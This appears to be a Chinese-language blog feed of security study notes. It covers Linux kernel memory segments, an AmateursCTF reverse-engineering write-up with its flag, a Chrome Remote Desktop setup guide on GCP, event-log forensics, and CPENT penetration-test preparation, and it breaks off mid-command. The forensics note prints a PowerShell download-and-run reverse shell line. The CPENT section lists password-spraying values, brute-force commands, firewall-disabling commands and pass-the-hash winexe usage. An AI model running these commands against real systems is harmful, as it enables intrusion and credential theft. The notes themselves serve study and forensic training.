class="hljs-keyword">if</span> (vma-&gt;vm_flags &amp; VM_WRITE)&#123;<br> <span class="hljs-keyword">if</span> (vma-&gt;vm flags &amp; VM_GROWSDOWN)&#123;<br>printk(<span class="hljs-string">&quot;Stack Segment: %lx - %lx\n&quot;</span>, vma-&gt;vm_start, vma-&gt;vm_end);<br><br><span class="hljs-comment">//strcpy(info[1].type, &quot;Stack&quot;);</span><br> &#125;<span class="hljs-keyword">else</span>&#123;<br>printk(<span class="hljs-string">&quot;Data/Heap Segment: &amp;lx - %lx\n&quot;</span>, vma-&gt;vm_start, vma-&gt;vm_end);<br><span class="hljs-comment">//strcpy(info[1].type, &quot;Data/Heap&quot;);</span><br> &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><br> printk(<span class="hljs-string">&quot;Other Segment: %lx - %lx\n&quot;</span>, vma-&gt;vm_start, vma-&gt;vm_end);<br> <span class="hljs-comment">//strcpy(info[1].type, &quot;Other&quot;) ;</span><br>&#125;<br><span class="hljs-comment">//_put_user(vma-&gt;vm_start, &amp;info[i].start, unsigned long);</span><br><span class="hljs-comment">//_put_user(vma-&gt;vm_end, &amp;info[i].end, unsigned long);</span><br><span class="hljs-comment">//i++;</span><br>&#125;<br><br><span class="hljs-comment">//copy to user(info, info, sizeof(struct segment_info));</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br></code></pre></td></tr></table></figure></li></ul><h1 id="QA"><a href="#QA" class="headerlink" title="QA"></a>QA</h1><ol><li><p>哪些segment是共享的?</p><blockquote><p>data bss code libary這四個segment是共享記憶體，stack、local storage、heap這三個segment則是不相同記憶體位置。</p></blockquote></li><li><p>heap的位置不一樣，為什麼?</p><blockquote><p>因為 heap 區域是一個記憶體區域，用於動態分配記憶體，每個 thread 都有自己的 heap 區域可以使用，所以它們的位置會不同。</p><p>雖然heap位置不相同，但其實也是共享的，其會根據libary或OS不同會有特殊的情況，例如linux是用C語言，heap會用malloc的方式實做，它會先去memory pool找一個可以使用的記憶體區塊(free list)，會在從free list裡面分給每個線程heap，所以heap段會是不同的。</p></blockquote></li><li><p>Thread local storage是用甚麼東西實作?</p><blockquote><p>會使用__thread，在宣告的時候加__thread就代表這個東西是TLS。</p></blockquote></li><li><p>每個thread的TLS會不同，這些thread之間可以去存取對方的TLS嗎?</p><blockquote><p>TLS是不同的，但是他們之間是可以互相存取的。</p></blockquote></li><li><p>建造多執行緒的寫法是?</p><blockquote><p>pthread_create。<br>pthread 的 pthread_create 函數可以用來建立新的執行緒，並以函數指標指定子執行緒所要執行的函數，子執行緒在建立之後，就會以平行的方式執行，在子執行緒的執行期間，主執行緒還是可以正常執行自己的工作，最後主執行緒再以 pthread_join 函數等待子執行緒執行結束，處理後續收尾的動作。</p><p>參考資料:<br><a href="https://ascii-iicsa.blogspot.com/2011/10/thread-local-storage.html">https://ascii-iicsa.blogspot.com/2011/10/thread-local-storage.html</a></p></blockquote></li><li><p>pthread_create函數會去使用什麼system call?如何調用?</p><blockquote><p>pthread_create會使用clone()這個system call，clone()會再去call do_fork這個function，do_fork會再去call copy_process，copy_process中有個copy_mm，linux實做共享記憶體的部分就是靠copy_mm達成。</p></blockquote></li><li><p>為什麼要使用copy from user?</p><blockquote><p>原理:因為安全機制的考量，程式載入的資料不會馬上放到記憶體上，會一直等到真的使用的時候才放到記憶體上。kernel要去使用這個資料的時候假如不在記憶體上，這種時候kernel會直接crash。</p><p>copy_from_user首先會檢查傳入地址的合法性，檢查後合法才會去做copy，同時也有修復機制避免系統直接crash。</p><p>這個問題主要涉及到2個層面，一個是copy_from_user()有自帶的access_ok檢查，如果用戶傳進來的buffer不屬於用戶空間而是內核空間，根本不會拷貝；二是copy_from_user()有自帶的page fault後exception修復機制。</p></blockquote></li></ol>]]></content>
    
    
    <categories>
      
      <category>筆記</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>nycu</tag>
      
      <tag>Note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Rev-AmateursCTF2023-Volcano</title>
    <link href="/2023/07/27/Rev-AmateursCTF2023-Volcano/"/>
    <url>/2023/07/27/Rev-AmateursCTF2023-Volcano/</url>
    
    <content type="html"><![CDATA[<ul><li>DIE<br><img src="https://i.imgur.com/21DREUc.png" alt="Image"></li></ul><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">透過_libc_start_main進入main <span class="hljs-keyword">function</span>，根據題目，給他需要的bear以及volcano，最後再找出符合判斷式的結果。<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/c3mSRqw.png" alt="Image"></p><ul><li><p>sub.c</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs smali"><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;stdbool.h&gt;</span><br><span class="hljs-built_in"></span><br><span class="hljs-built_in">int </span>sub_1209(int x) &#123;<br>    <br>   <span class="hljs-built_in"> int </span>v3;<br><br>    v3 = 0;<br><br>    while(x)&#123;<br>        ++v3;<br>        x /= 10;<br>    &#125;<br><br>   <span class="hljs-built_in"> return </span>v3;<br>&#125;<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">int </span>sub_124D(int x) &#123;<br>    <br>   <span class="hljs-built_in"> int </span>v3 = 0;<br><br>    while (x)&#123;<br>        v3 += x % 10;<br>        x /= 10;<br>    &#125;<br>   <span class="hljs-built_in"> return </span>v3;<br>&#125;<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">int </span>sub_1430(int a,<span class="hljs-built_in"> int </span>b,<span class="hljs-built_in"> int </span>c) &#123;<br>    <br>   <span class="hljs-built_in"> int </span>v5;<br>   <span class="hljs-built_in"> int </span>v6 = 1;<br>    v5 = a % c;<br><br>    while (b)&#123;<br>       <span class="hljs-built_in"> if </span>((b&amp;1)!=0)<br>            v6 = v5 * v6%c;<br>        b &gt;&gt;= 1;<br>        v5 = v5 * v5 % c;<br>    &#125;<br>   <span class="hljs-built_in"> return </span>v6;<br>&#125;<br><br>bool isbear(unsigned<span class="hljs-built_in"> int </span>bear)&#123;<br><br>   <span class="hljs-built_in"> if </span>((bear &amp; 1) != 0)<br>       <span class="hljs-built_in"> return </span>false;<br>   <span class="hljs-built_in"> if </span>((bear % 3) !=2)<br>       <span class="hljs-built_in"> return </span>false;<br>   <span class="hljs-built_in"> if </span>((bear % 5) != 1)<br>       <span class="hljs-built_in"> return </span>false;<br>   <span class="hljs-built_in"> if </span>((bear % 7) == 3)<br>       <span class="hljs-built_in"> return </span>bear % 0x6D == 55;<br>    <br>   <span class="hljs-built_in"> return </span>false;<br><br>&#125;<br><br>bool isvol(unsigned<span class="hljs-built_in"> int </span>v)&#123;<br><br><br>    unsigned<span class="hljs-built_in"> int </span>result;<br><br>    result = 0;<br><br>    while (v)&#123;<br>        result += v &amp; 1;<br>        v &gt;&gt;= 1;<br>    &#125;<br><br>   <span class="hljs-built_in"> return </span>result &gt; 0x10 &amp;&amp; result &lt;= 0x1A;<br>&#125;<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">int </span>main() &#123;<br>    <br>   <span class="hljs-built_in"> int </span>v9;<br>   <span class="hljs-built_in"> int </span>v10 = 4919;<br>   <span class="hljs-built_in"> int </span>volcano;<br>   <span class="hljs-built_in"> int </span>bear;<br>    printf(<span class="hljs-string">&quot;Finding numbers that satisfy the conditions...\n&quot;</span>);<br>    <br><br>    for (unsigned<span class="hljs-built_in"> int </span>bear = 0; bear &lt; 1000000; bear++) &#123;<br>       <span class="hljs-built_in"> if </span>(isbear(bear)) &#123;<br>            for (unsigned<span class="hljs-built_in"> int </span>volcano = 0; volcano &lt; 1000000; volcano++) &#123;<br>               <span class="hljs-built_in"> if </span>(isvol(volcano) &amp;&amp;<br>                    sub_1209(volcano) == sub_1209(bear) &amp;&amp;<br>                    sub_124D(volcano) == sub_124D(bear)) &#123;<br>                    for (v9 = 3; v9 &lt; 1000000; v9 += 2) &#123;<br>                       <span class="hljs-built_in"> if </span>(v9 != 1 &amp;&amp;<br>                            sub_1430(v10, volcano, v9) == sub_1430(v10, bear, v9)) &#123;<br>                            printf(<span class="hljs-string">&quot;Found a number that satisfies the conditions: %d\n&quot;</span>, v9);<br>                            printf(<span class="hljs-string">&quot;bear: %u, volcano: %u\n&quot;</span>, bear, volcano);<br>                           <span class="hljs-built_in"> return </span>0;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <br>   <span class="hljs-built_in"> return </span>0;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/mSbkemi.png" alt="Image"></p></li><li><p>FLAG</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">amateursCTF&#123;yep_th0se_l00k_th3_s4me_to_m3!_:clueless:&#125;<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>REV</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GCP 安裝 Chrome-Remote-Desktop</title>
    <link href="/2023/07/25/GCP-%E5%AE%89%E8%A3%9D-Chrome-Remote-Desktop/"/>
    <url>/2023/07/25/GCP-%E5%AE%89%E8%A3%9D-Chrome-Remote-Desktop/</url>
    
    <content type="html"><![CDATA[<h1 id="環境"><a href="#環境" class="headerlink" title="環境"></a>環境</h1><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GCP</span> N1<br><span class="hljs-attribute">Ubuntu</span> <span class="hljs-number">22</span>.<span class="hljs-number">04</span> LTS x86_64 <br></code></pre></td></tr></table></figure><h2 id="VPS安裝Chrome遠端桌面"><a href="#VPS安裝Chrome遠端桌面" class="headerlink" title="VPS安裝Chrome遠端桌面"></a>VPS安裝Chrome遠端桌面</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">wget https://<span class="hljs-keyword">dl</span>.google.<span class="hljs-keyword">com</span>/linux/direct/chrome-remote-desktop_current_amd64.<span class="hljs-keyword">deb</span><br><br>sudo apt-<span class="hljs-built_in">get</span> install --assume-yes ./chrome-remote-desktop_current_amd64.<span class="hljs-keyword">deb</span><br></code></pre></td></tr></table></figure><h2 id="安裝桌面環境"><a href="#安裝桌面環境" class="headerlink" title="安裝桌面環境"></a>安裝桌面環境</h2><ul><li><p>更新存儲庫</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">sudo apt <span class="hljs-keyword">update</span> <span class="hljs-variable">&amp;&amp;</span> sudo apt upgrade<br></code></pre></td></tr></table></figure></li><li><p>安裝並設置顯示管理器。使用slim是因為它的輕量級特性</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> slim<br></code></pre></td></tr></table></figure></li><li><p>安裝Ubuntu桌面環境</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> ubuntu-desktop<br></code></pre></td></tr></table></figure></li><li><p>安裝完成後，重啟機器</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo reboot</span><br></code></pre></td></tr></table></figure></li><li><p>重啟後會失去連接。再次通過 SSH 進入虛擬機啟動 slim</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">sudo service slim <span class="hljs-literal">start</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="配置Chrome-Remote-Desktop"><a href="#配置Chrome-Remote-Desktop" class="headerlink" title="配置Chrome-Remote-Desktop"></a>配置Chrome-Remote-Desktop</h2><ul><li><p>設定其他電腦，並持續下一步<br><img src="https://i.imgur.com/L4RwNfq.png" alt="Image"></p></li><li><p>將最後一步指令複製到VPS主機上<br><img src="https://i.imgur.com/ZHE9iEE.png" alt="Image"></p></li><li><p>輸入六位數PIN，即可成功<br><img src="https://i.imgur.com/ixZP3eZ.png" alt="Image"></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>筆記</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VPS</tag>
      
      <tag>Note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CyberLab-Eventlog</title>
    <link href="/2021/09/17/CyberLab-Eventlog%E5%88%86%E6%9E%90/"/>
    <url>/2021/09/17/CyberLab-Eventlog%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="Cyberlab-event-log-分析"><a href="#Cyberlab-event-log-分析" class="headerlink" title="Cyberlab event log 分析"></a>Cyberlab event log 分析</h1><ul><li>凡走過必留下痕跡<ul><li>File </li><li>Network </li><li>Process&amp;Memory</li></ul></li></ul><h3 id="Threat-hunting"><a href="#Threat-hunting" class="headerlink" title="Threat hunting"></a>Threat hunting</h3><p>準備 &gt; 偵測分析 &gt; 移除復原 &gt; 後續檢討</p><h3 id="事件調查思路"><a href="#事件調查思路" class="headerlink" title="事件調查思路"></a>事件調查思路</h3><ul><li>人<ul><li>確認誰被攻擊</li><li>確認攻擊來源</li></ul></li><li>事<ul><li>確認事件類別</li><li>過去是否發生過</li></ul></li><li>時<ul><li>確認攻擊時間點</li></ul></li><li>地<ul><li>確認發生的網段</li><li>誰可以存取</li><li>平時如何管理</li></ul></li><li>物<ul><li>確認有甚麼東西產生</li><li>確認是否有東西流出</li></ul></li></ul><h3 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h3><ul><li>History&amp;log<ul><li>shell history</li><li>Web accesslog</li><li>Eventlog</li></ul></li><li>Process<ul><li>Services</li><li>Connection</li></ul></li><li>File<ul><li>App(binary,script)</li><li>Autoruns</li><li>Config</li></ul></li></ul><h3 id="linux-forensic-file-webshell"><a href="#linux-forensic-file-webshell" class="headerlink" title="linux forensic (file-webshell)"></a>linux forensic (file-webshell)</h3><ul><li>Web service access logs:<ul><li>mtime n : File’s data was last modified n minutes ago</li><li>atime n : File was last accessed n minutes ago.</li></ul></li></ul><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">cat access |<span class="hljs-type">grep</span> -i <span class="hljs-string">&quot;200&quot;</span> |<span class="hljs-type">grep</span> -i <span class="hljs-string">&quot;.php&quot;</span> | <span class="hljs-type">cut</span> -d <span class="hljs-string">&quot; &quot;</span> -f <span class="hljs-number">7</span> |<span class="hljs-type">sort</span> |<span class="hljs-type">uniq</span> -c |<span class="hljs-type">sort</span> -nr |<span class="hljs-type">less</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cat</span> access.log.<span class="hljs-number">2</span>|grep -i &#x27;.php&#x27; | grep -Ei <span class="hljs-string">&quot;s.php|admine21_decode.php&quot;</span> -B <span class="hljs-number">10</span> | cut -d <span class="hljs-string">&quot; &quot;</span> -f <span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">7</span>|less<br></code></pre></td></tr></table></figure><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">zless access.log<span class="hljs-number">.2</span>.gz|<span class="hljs-type">grep</span> -iE <span class="hljs-string">&quot;\/s.php|admin21_decode.php&quot;</span> | <span class="hljs-type">cut</span> -d <span class="hljs-string">&quot; &quot;</span> -f <span class="hljs-number">1</span> | <span class="hljs-type">sort</span> |<span class="hljs-type">uniq</span><br></code></pre></td></tr></table></figure><ul><li>ps -ef</li><li>ls &#x2F;proc</li><li>strace -f -p pid</li><li>lsof -i:port</li><li>lsof -p pid</li><li>crontab -e</li><li>cat &#x2F;etc&#x2F;rc.local</li><li>ls &#x2F;etc&#x2F;init.d</li><li>ls &#x2F;etc&#x2F;profile.d</li><li>ls &#x2F;var&#x2F;log&#x2F;cron*</li><li>ls &#x2F;var&#x2F;log&#x2F;secure*</li></ul><h3 id="lab-windows7-iis-server-forensic"><a href="#lab-windows7-iis-server-forensic" class="headerlink" title="lab - windows7 iis server forensic"></a>lab - windows7 iis server forensic</h3><ul><li>History&amp;log<ul><li>web access log (iis log)</li><li>eventlog (4688,sysmon)</li></ul></li><li>Process<ul><li>services</li><li>connection</li></ul></li><li>File <ul><li>App (binary,script)</li><li>autoruns</li><li>config</li></ul></li><li>executing history<ul><li>shimacache</li><li>amcache</li></ul></li></ul><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">IEX(<span class="hljs-params">new</span>-<span class="hljs-params">object</span> <span class="hljs-params">system</span>.<span class="hljs-params">net</span>.<span class="hljs-params">webclient</span>)</span>.downloadstring(&#x27;http:<span class="hljs-comment">//ip/powercat.ps1&#x27;);powercat -c ip -p 4040 -e cmd.exe</span><br></code></pre></td></tr></table></figure><ul><li>windows webshell </li><li>parentprocessid:3444 </li><li>parentimage: w3wp.exe</li></ul>]]></content>
    
    
    <categories>
      
      <category>筆記</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CPENT-考前準備</title>
    <link href="/2021/07/17/CPENT-%E8%80%83%E5%89%8D%E6%BA%96%E5%82%99/"/>
    <url>/2021/07/17/CPENT-%E8%80%83%E5%89%8D%E6%BA%96%E5%82%99/</url>
    
    <content type="html"><![CDATA[<h1 id="CPENT-考前準備"><a href="#CPENT-考前準備" class="headerlink" title="CPENT 考前準備"></a>CPENT 考前準備</h1><h2 id="ilabs"><a href="#ilabs" class="headerlink" title="ilabs"></a>ilabs</h2><ul><li><p>Windows server 2019 </p><ul><li>192.168.0.20</li><li>172.19.19.20</li></ul></li><li><p>Parrot</p><ul><li>192.168.0.18</li><li>172.19.19.18</li></ul></li><li><p>密碼噴灑</p><blockquote><p>kevin (username)</p></blockquote><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams">Pa<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>w0rd123<br>owaspbwa<br></code></pre></td></tr></table></figure></li></ul><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><ul><li><p><b>ICMP 封包 基礎知識</b></p><ul><li>訊息型態(message type)<ul><li>Type:8 Echo Request（回應要求） #要求對方主機回聲</li><li>Type:0 Echo Reply（回應答覆）   #主機回聲答覆</li><li>Wireshark接收ICMP封包<br>  <img src="https://i.imgur.com/58fxInL.png"></li></ul></li></ul></li><li><p><b>NMAP 檢測存活主機(KEEP-ALIVE)</b></p><ul><li>ICMP掃描</li><li>nmap -sn 特權模式掃描 <ul><li>LAN -&gt; 發送ARP封包</li><li>WAN -&gt; 發送TCP SYN-&gt;443port,ACK-&gt;80port 封包 以及icmp requests type8&#x2F;13，若都無reply即判定close  <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">nmap</span> -<span class="hljs-keyword">sn</span> -n <span class="hljs-symbol">&lt;ip&gt;</span><br></code></pre></td></tr></table></figure></li><li>若還是無法找到存活主機，bypass keepalive階段直接進行port掃描  <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -Pn -n -p21-<span class="hljs-number">25</span>,<span class="hljs-number">80</span>,<span class="hljs-number">3389</span> &lt;ip&gt; <br></code></pre></td></tr></table></figure></li></ul></li></ul></li><li><p><b>列舉系統版本</b></p><ul><li><p>利用smb-os-discovery枚舉系統版本</p>  <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">nmap -Pn -n -p139,445 <span class="hljs-attribute">--script</span>=smb-os-discovery &lt;ip&gt;<br></code></pre></td></tr></table></figure><p>  <img src="https://i.imgur.com/8ojliDs.png"></p></li><li><p>利用smb-protocols查詢對方smb可支援協議版本</p>  <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">nmap -Pn -n -p139,445 <span class="hljs-attribute">--script</span>=smb-protocols &lt;ip&gt;<br></code></pre></td></tr></table></figure><p>  <img src="https://i.imgur.com/sR7wRkv.png"></p></li></ul></li><li><p><b>內網腳本掃描</b></p><ul><li>ping.sh  <figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs typescript">#/bin/bash<br><br>network=<span class="hljs-string">&quot;192.168.50&quot;</span><br><br><span class="hljs-title function_">is_ping</span>(<span class="hljs-params"></span>)&#123;<br><br>ping -c <span class="hljs-number">1</span> -w <span class="hljs-number">1</span> $network.<span class="hljs-property">$i</span> &gt; <span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br>[ $? -eq <span class="hljs-number">0</span> ] &amp;&amp; echo $i is up.<br>&#125;<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(seq <span class="hljs-number">1</span> <span class="hljs-number">255</span>)<br><span class="hljs-keyword">do</span> <br>is_ping $i<br>done<br></code></pre></td></tr></table></figure></li></ul></li></ul><h2 id="內網測試"><a href="#內網測試" class="headerlink" title="內網測試"></a>內網測試</h2><ul><li><p><b>Windows網路芳鄰</b></p><ul><li>UDP 137 -&gt; NETBIOS 名稱解析</li><li>UDP 138 -&gt; NETBIOS 服務宣告</li><li>TCP 139 -&gt; SMB&#x2F;CIFS (smb為協定，cifs為服務)</li></ul></li><li><p><b>SMB&#x2F;CIFS (TCP 139,445)</b></p><ul><li>AUTHENTICATION (NTLM V1,V2) (主要作為驗證手段)</li><li>File &amp; Print sharing (檔案分享)</li><li>IPC (inter-process communication)(remote cmd)</li></ul></li><li><p><b>分散式運算控制Windows</b></p><ul><li>IPC (SMB)</li><li>RPC</li><li>WinRM &#x2F;WMI</li></ul></li><li><p><b>SMB VERSION</b></p><ul><li>v1</li><li>v2:support digital signature </li><li>v3:support encrypt</li></ul><p>   <img src="https://i.imgur.com/GJb3eJN.png"></p></li><li><p><b>NetBIOS基礎知識</b></p><ul><li>NetBIOS 名稱<ul><li>Total 16 字元</li><li>1-15:電腦名稱</li><li>16th:服務代號</li></ul></li><li>nbtstat -n 查看本機netbios註冊資訊<br>  <img src="https://i.imgur.com/vUO9PvL.png"></li></ul></li><li><p><b>nbtstat 查詢別台主機netbios資訊</b></p><ul><li><p>利用IP查詢 (如無法查詢可能為FW阻擋)</p>  <figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">nbtstat</span> -A &lt;<span class="hljs-built_in">ip</span>&gt;<br></code></pre></td></tr></table></figure></li><li><p>利用computerName解析IP查詢</p>  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">nbtstat -a <span class="hljs-tag">&lt;<span class="hljs-name">computername</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>關閉防火牆</p>  <figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pf"><span class="hljs-comment">#舊版</span><br>netsh firewall <span class="hljs-built_in">set</span> opmode disable<br><span class="hljs-comment">#新版(win2012/2019)</span><br>netsh advfirewall <span class="hljs-built_in">set</span> allprofiles <span class="hljs-keyword">state</span> off<br></code></pre></td></tr></table></figure></li><li><p>IPtables 設為允許</p>   <figure class="highlight tp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tp">sudo iptables -S<br>sudo iptables -<span class="hljs-keyword">P</span> INPUT <span class="hljs-keyword">ACC</span>EPT<br>sudo iptables -<span class="hljs-keyword">P</span> OUTPUT <span class="hljs-keyword">ACC</span>EPT<br></code></pre></td></tr></table></figure></li></ul></li><li><p><b>egress busting (Reverse 對外爆破)</b></p><ul><li>目標NC   <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -nvz &lt;ip&gt; <span class="hljs-number">1</span>-<span class="hljs-number">1024</span><br></code></pre></td></tr></table></figure></li><li>本地監聽  <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wireshark</span> OR tcpdump -i eth0 tcp[<span class="hljs-number">13</span>]==<span class="hljs-number">2</span> # SYN<br></code></pre></td></tr></table></figure></li></ul></li><li><p><b>暴力破解</b></p><ul><li><p>windows smb auth (smb認證爆破)</p>  <figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">crackmapexec smb ip -u &lt;username <span class="hljs-keyword">or</span> <span class="hljs-built_in">file</span>&gt; -p &lt;password <span class="hljs-keyword">or</span> <span class="hljs-built_in">file</span>&gt;<br></code></pre></td></tr></table></figure></li><li><p>rdp brute (rdp認證爆破)</p>  <figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bnf">crowbar -b rdp -v -U <span class="hljs-attribute">&lt;userfile&gt;</span> -C <span class="hljs-attribute">&lt;passfile&gt;</span> -s <span class="hljs-attribute">&lt;ip/CIDR&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>hydra ssh (ssh爆破)</p>  <figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">hydra -l <span class="hljs-keyword">user</span> <span class="hljs-title">-P</span> passfile ssh ip -F -V<br></code></pre></td></tr></table></figure></li><li><p>linux 執行windows cmd</p>  <figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">winexe -U &#x27;administrator%Pa$$w0rd&#x27; <span class="hljs-comment">//&lt;ip&gt; cmd.exe</span><br>pth-winexe -U &#x27;administrator%<span class="hljs-number">92937945</span>B<span class="hljs-number">51881434</span>1DE3F<span 